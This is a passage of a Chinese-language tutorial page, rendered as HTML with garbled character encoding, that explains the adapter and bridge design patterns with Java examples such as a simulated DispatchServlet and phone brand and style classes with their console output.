 <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;HandlerAdapter&gt; handlerAdapters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;HandlerAdapter&gt;();<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">DispatchServlet</span><span class="hljs-params">()</span> &#123;<br>      handlerAdapters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationHandlerAdapter</span>());<br>      handlerAdapters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpHandlerAdapter</span>());<br>      handlerAdapters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleHandlerAdapter</span>());<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">()</span> &#123;<br><br>      <span class="hljs-comment">// æ­¤å¤„æ¨¡æ‹ŸSpringMVCä»requestå–handlerçš„å¯¹è±¡ï¼Œ</span><br>      <span class="hljs-comment">// é€‚é…å™¨å¯ä»¥è·å–åˆ°å¸Œæœ›çš„Controller</span><br>       <span class="hljs-type">HttpController</span> <span class="hljs-variable">controller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpController</span>();<br>      <span class="hljs-comment">// AnnotationController controller = new AnnotationController();</span><br>      <span class="hljs-comment">//SimpleController controller = new SimpleController();</span><br>      <span class="hljs-comment">// å¾—åˆ°å¯¹åº”é€‚é…å™¨</span><br>      <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">adapter</span> <span class="hljs-operator">=</span> getHandler(controller);<br>      <span class="hljs-comment">// é€šè¿‡é€‚é…å™¨æ‰§è¡Œå¯¹åº”çš„controllerå¯¹åº”æ–¹æ³•</span><br>      adapter.handle(controller);<br><br>   &#125;<br><br>   <span class="hljs-keyword">public</span> HandlerAdapter <span class="hljs-title function_">getHandler</span><span class="hljs-params">(Controller controller)</span> &#123;<br>      <span class="hljs-comment">//éå†ï¼šæ ¹æ®å¾—åˆ°çš„controller(handler), è¿”å›å¯¹åº”é€‚é…å™¨</span><br>      <span class="hljs-keyword">for</span> (HandlerAdapter adapter : <span class="hljs-built_in">this</span>.handlerAdapters) &#123;<br>         <span class="hljs-keyword">if</span> (adapter.supports(controller)) &#123;<br>            <span class="hljs-keyword">return</span> adapter;<br>         &#125;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">DispatchServlet</span>().doDispatch(); <span class="hljs-comment">// http...</span><br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é€‚é…å™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#é€‚é…å™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> é€‚é…å™¨æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>ä¸‰ç§å‘½åæ–¹å¼ï¼Œæ˜¯æ ¹æ® src æ˜¯ä»¥æ€æ ·çš„å½¢å¼ç»™åˆ° Adapterï¼ˆåœ¨ Adapter é‡Œçš„å½¢å¼ï¼‰æ¥å‘½åçš„ã€‚</p></li><li></li></ol><ol><li>ç±»é€‚é…å™¨ï¼šä»¥ç±»ç»™åˆ°ï¼Œåœ¨ Adapter é‡Œï¼Œå°±æ˜¯å°† src å½“åšç±»ï¼Œç»§æ‰¿</li><li>å¯¹è±¡é€‚é…å™¨ï¼šä»¥å¯¹è±¡ç»™åˆ°ï¼Œåœ¨ Adapter é‡Œï¼Œå°† src ä½œä¸ºä¸€ä¸ªå¯¹è±¡ï¼ŒæŒæœ‰</li><li>æ¥å£é€‚é…å™¨ï¼šä»¥æ¥å£ç»™åˆ°ï¼Œåœ¨ Adapter é‡Œï¼Œå°† src ä½œä¸ºä¸€ä¸ªæ¥å£ï¼Œå®ç°</li></ol><ol start="3"><li><p>Adapter æ¨¡å¼æœ€å¤§çš„ä½œç”¨è¿˜æ˜¯å°†åŸæœ¬ä¸å…¼å®¹çš„æ¥å£èåˆåœ¨ä¸€èµ·å·¥ä½œã€‚</p></li><li><p>å®é™…å¼€å‘ä¸­ï¼Œå®ç°èµ·æ¥ä¸æ‹˜æ³¥äºæˆ‘ä»¬è®²è§£çš„ä¸‰ç§ç»å…¸å½¢å¼</p></li></ol><h1 id="æ¡¥æ¥æ¨¡å¼"><a class="markdownIt-Anchor" href="#æ¡¥æ¥æ¨¡å¼"></a> <mark>æ¡¥æ¥æ¨¡å¼</mark></h1><p>æ¡¥æ¥ï¼ˆBridgeï¼‰æ˜¯ç”¨äºæŠŠæŠ½è±¡åŒ–ä¸å®ç°åŒ–è§£è€¦ï¼Œä½¿å¾—äºŒè€…å¯ä»¥ç‹¬ç«‹å˜åŒ–ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒé€šè¿‡æä¾›æŠ½è±¡åŒ–å’Œå®ç°åŒ–ä¹‹é—´çš„æ¡¥æ¥ç»“æ„ï¼Œæ¥å®ç°äºŒè€…çš„è§£è€¦ã€‚</p><p>è¿™ç§æ¨¡å¼æ¶‰åŠåˆ°ä¸€ä¸ªä½œä¸ºæ¡¥æ¥çš„æ¥å£ï¼Œä½¿å¾—å®ä½“ç±»çš„åŠŸèƒ½ç‹¬ç«‹äºæ¥å£å®ç°ç±»ã€‚è¿™ä¸¤ç§ç±»å‹çš„ç±»å¯è¢«ç»“æ„åŒ–æ”¹å˜è€Œäº’ä¸å½±å“ã€‚</p><hr /><h2 id="ä»‹ç»-6"><a class="markdownIt-Anchor" href="#ä»‹ç»-6"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> å°†æŠ½è±¡éƒ¨åˆ†ä¸å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬éƒ½å¯ä»¥ç‹¬ç«‹çš„å˜åŒ–ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> åœ¨æœ‰å¤šç§å¯èƒ½ä¼šå˜åŒ–çš„æƒ…å†µä¸‹ï¼Œç”¨ç»§æ‰¿ä¼šé€ æˆç±»çˆ†ç‚¸é—®é¢˜ï¼Œæ‰©å±•èµ·æ¥ä¸çµæ´»ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> å®ç°ç³»ç»Ÿå¯èƒ½æœ‰å¤šä¸ªè§’åº¦åˆ†ç±»ï¼Œæ¯ä¸€ç§è§’åº¦éƒ½å¯èƒ½å˜åŒ–ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> æŠŠè¿™ç§å¤šè§’åº¦åˆ†ç±»åˆ†ç¦»å‡ºæ¥ï¼Œè®©å®ƒä»¬ç‹¬ç«‹å˜åŒ–ï¼Œå‡å°‘å®ƒä»¬ä¹‹é—´è€¦åˆã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> æŠ½è±¡ç±»ä¾èµ–å®ç°ç±»ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong><br />1ã€çŒªå…«æˆ’ä»å¤©è“¬å…ƒå¸…è½¬ä¸–æŠ•èƒåˆ°çŒªï¼Œè½¬ä¸–æŠ•èƒçš„æœºåˆ¶å°†å°˜ä¸–åˆ’åˆ†ä¸ºä¸¤ä¸ªç­‰çº§ï¼Œå³ï¼šçµé­‚å’Œè‚‰ä½“ï¼Œå‰è€…ç›¸å½“äºæŠ½è±¡åŒ–ï¼Œåè€…ç›¸å½“äºå®ç°åŒ–ã€‚ç”Ÿçµé€šè¿‡åŠŸèƒ½çš„å§”æ´¾ï¼Œè°ƒç”¨è‚‰ä½“å¯¹è±¡çš„åŠŸèƒ½ï¼Œä½¿å¾—ç”Ÿçµå¯ä»¥åŠ¨æ€åœ°é€‰æ‹©ã€‚<br />2ã€å¢™ä¸Šçš„å¼€å…³ï¼Œå¯ä»¥çœ‹åˆ°çš„å¼€å…³æ˜¯æŠ½è±¡çš„ï¼Œä¸ç”¨ç®¡é‡Œé¢å…·ä½“æ€ä¹ˆå®ç°çš„ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€æŠ½è±¡å’Œå®ç°çš„åˆ†ç¦»ã€‚ 2ã€ä¼˜ç§€çš„æ‰©å±•èƒ½åŠ›ã€‚ 3ã€å®ç°ç»†èŠ‚å¯¹å®¢æˆ·é€æ˜ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> æ¡¥æ¥æ¨¡å¼çš„å¼•å…¥ä¼šå¢åŠ ç³»ç»Ÿçš„ç†è§£ä¸è®¾è®¡éš¾åº¦ï¼Œç”±äºèšåˆå…³è”å…³ç³»å»ºç«‹åœ¨æŠ½è±¡å±‚ï¼Œè¦æ±‚å¼€å‘è€…é’ˆå¯¹æŠ½è±¡è¿›è¡Œè®¾è®¡ä¸ç¼–ç¨‹ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong><br />1ã€å¦‚æœä¸€ä¸ªç³»ç»Ÿéœ€è¦åœ¨æ„ä»¶çš„æŠ½è±¡åŒ–è§’è‰²å’Œå…·ä½“åŒ–è§’è‰²ä¹‹é—´å¢åŠ æ›´å¤šçš„çµæ´»æ€§ï¼Œé¿å…åœ¨ä¸¤ä¸ªå±‚æ¬¡ä¹‹é—´å»ºç«‹é™æ€çš„ç»§æ‰¿è”ç³»ï¼Œé€šè¿‡æ¡¥æ¥æ¨¡å¼å¯ä»¥ä½¿å®ƒä»¬åœ¨æŠ½è±¡å±‚å»ºç«‹ä¸€ä¸ªå…³è”å…³ç³»ã€‚<br />2ã€å¯¹äºé‚£äº›ä¸å¸Œæœ›ä½¿ç”¨ç»§æ‰¿æˆ–å› ä¸ºå¤šå±‚æ¬¡ç»§æ‰¿å¯¼è‡´ç³»ç»Ÿç±»çš„ä¸ªæ•°æ€¥å‰§å¢åŠ çš„ç³»ç»Ÿï¼Œæ¡¥æ¥æ¨¡å¼å°¤ä¸ºé€‚ç”¨ã€‚ 3ã€ä¸€ä¸ªç±»å­˜åœ¨ä¸¤ä¸ªç‹¬ç«‹å˜åŒ–çš„ç»´åº¦ï¼Œä¸”è¿™ä¸¤ä¸ªç»´åº¦éƒ½éœ€è¦è¿›è¡Œæ‰©å±•ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> å¯¹äºä¸¤ä¸ªç‹¬ç«‹å˜åŒ–çš„ç»´åº¦ï¼Œä½¿ç”¨æ¡¥æ¥æ¨¡å¼å†é€‚åˆä¸è¿‡äº†ã€‚</p><p><strong>åŸç†ç±»å›¾ï¼š</strong><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102143047364.png" alt="image-20230102143047364" /></p><h2 id="å®ç°-4"><a class="markdownIt-Anchor" href="#å®ç°-4"></a> å®ç°</h2><p>æ‰‹æœºæ“ä½œé—®é¢˜</p><p>ç°åœ¨å¯¹ä¸åŒæ‰‹æœºç±»å‹çš„ä¸åŒå“ç‰Œå®ç°æ“ä½œç¼–ç¨‹(æ¯”å¦‚:å¼€æœºã€å…³æœºã€ä¸Šç½‘ï¼Œæ‰“ç”µè¯ç­‰)ï¼Œå¦‚å›¾:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102144821435.png" alt="image-20230102144821435" /></p><p>ä½¿ç”¨æ¡¥æ¥æ¨¡å¼å¯¹åº”çš„ç±»å›¾</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230102145034564.png" alt="image-20230102145034564" /></p><p><code>Brand</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-comment">//æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Brand</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>XiaoMi</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaoMi</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Brand</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; å°ç±³æ‰‹æœºå¼€æœº &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; å°ç±³æ‰‹æœºå…³æœº &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; å°ç±³æ‰‹æœºæ‰“ç”µè¯ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Vivo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vivo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Brand</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; Vivoæ‰‹æœºå¼€æœº &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; Vivoæ‰‹æœºå…³æœº &quot;</span>);<br>   &#125;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; Vivoæ‰‹æœºæ‰“ç”µè¯ &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Phone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br>   <br>   <span class="hljs-comment">//ç»„åˆå“ç‰Œ</span><br>   <span class="hljs-keyword">private</span> Brand brand;<br><br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Phone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>      <span class="hljs-built_in">super</span>();<br>      <span class="hljs-built_in">this</span>.brand = brand;<br>   &#125;<br>   <br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">this</span>.brand.open();<br>   &#125;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      brand.close();<br>   &#125;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      brand.call();<br>   &#125;<br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>FoldedPhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><br><span class="hljs-comment">//æŠ˜å å¼æ‰‹æœºç±»ï¼Œç»§æ‰¿ æŠ½è±¡ç±» Phone</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FoldedPhone</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Phone</span> &#123;<br><br>   <span class="hljs-comment">//æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">FoldedPhone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>      <span class="hljs-built_in">super</span>(brand);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>.open();<br>      System.out.println(<span class="hljs-string">&quot; æŠ˜å æ ·å¼æ‰‹æœº &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>.close();<br>      System.out.println(<span class="hljs-string">&quot; æŠ˜å æ ·å¼æ‰‹æœº &quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">super</span>.call();<br>      System.out.println(<span class="hljs-string">&quot; æŠ˜å æ ·å¼æ‰‹æœº &quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>UpRightPhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpRightPhone</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Phone</span> &#123;<br>   <br>      <span class="hljs-comment">//æ„é€ å™¨</span><br>      <span class="hljs-keyword">public</span> <span class="hljs-title function_">UpRightPhone</span><span class="hljs-params">(Brand brand)</span> &#123;<br>         <span class="hljs-built_in">super</span>(brand);<br>      &#125;<br>      <br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-built_in">super</span>.open();<br>         System.out.println(<span class="hljs-string">&quot; ç›´ç«‹æ ·å¼æ‰‹æœº &quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-built_in">super</span>.close();<br>         System.out.println(<span class="hljs-string">&quot; ç›´ç«‹æ ·å¼æ‰‹æœº &quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span> &#123;<br>         <span class="hljs-built_in">super</span>.call();<br>         System.out.println(<span class="hljs-string">&quot; ç›´ç«‹æ ·å¼æ‰‹æœº &quot;</span>);<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.bridge;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <br>      <span class="hljs-comment">//è·å–æŠ˜å å¼æ‰‹æœº (æ ·å¼ + å“ç‰Œ )</span><br>      <br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br>      <br>      phone1.open();<br>      phone1.call();<br>      phone1.close();<br>      <br>      System.out.println(<span class="hljs-string">&quot;----------------------&quot;</span>);<br>      <br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FoldedPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br>      <br>      phone2.open();<br>      phone2.call();<br>      phone2.close();<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br><br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">XiaoMi</span>());<br>      <br>      phone3.open();<br>      phone3.call();<br>      phone3.close();<br>      <br>      System.out.println(<span class="hljs-string">&quot;--------------&quot;</span>);<br><br>      <span class="hljs-type">Phone</span> <span class="hljs-variable">phone4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpRightPhone</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vivo</span>());<br>      <br>      phone4.open();<br>      phone4.call();<br>      phone4.close();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å°ç±³æ‰‹æœºå¼€æœº <br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå…³æœº </span><br><span class="hljs-code"> æŠ˜å æ ·å¼æ‰‹æœº </span><br><br>++++++++++++++++++++++<br><br> Vivoæ‰‹æœºå¼€æœº <br> æŠ˜å æ ·å¼æ‰‹æœº <br> Vivoæ‰‹æœºæ‰“ç”µè¯ <br> æŠ˜å æ ·å¼æ‰‹æœº <br> Vivoæ‰‹æœºå…³æœº <br> æŠ˜å æ ·å¼æ‰‹æœº <br><br>++++++++++++++<br><br><span class="hljs-code"> å°ç±³æ‰‹æœºå¼€æœº </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºæ‰“ç”µè¯ </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><span class="hljs-code"> å°ç±³æ‰‹æœºå…³æœº </span><br><span class="hljs-code"> ç›´ç«‹æ ·å¼æ‰‹æœº </span><br><br>++++++++++++++<br><br> Vivoæ‰‹æœºå¼€æœº <br> ç›´ç«‹æ ·å¼æ‰‹æœº <br> Vivoæ‰‹æœºæ‰“ç”µè¯ <br> ç›´ç«‹æ ·å¼æ‰‹æœº <br> Vivoæ‰‹æœºå…³æœº <br> ç›´ç«‹æ ·å¼æ‰‹æœº <br></code></pre></td></tr></table></figure><p>å¢åŠ æ‰‹æœºæ ·å¼ç±»</p><p><code>SildePhone</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 